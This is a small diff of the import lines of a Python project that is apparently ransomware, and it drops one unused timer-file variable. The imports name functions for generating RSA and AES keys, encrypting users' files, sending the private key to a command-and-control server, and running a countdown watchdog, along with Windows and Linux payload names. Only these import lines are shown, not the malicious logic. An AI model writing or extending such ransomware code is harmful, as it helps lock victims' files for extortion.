@@ -1,6 +1,6 @@
 import multiprocessing
 from datetime import datetime, timedelta
-from Core.Variables import seconds_left, timer_file_name, script_name_exe, script_name_elf, ports
+from Core.Variables import seconds_left, script_name_exe, script_name_elf, ports
 from Crypto.Encrypt import generate_rsa_keys, save_encrypted_aes_key, save_rsa_keys, generate_symmetric_key, encrypt_aes_key_with_rsa, encrypt_user_files
 from Core.Timer import save_timer_data, watchdog_timer,load_timer_data
 from Crypto.RSA_Key_Handling import send_private_key_to_c2
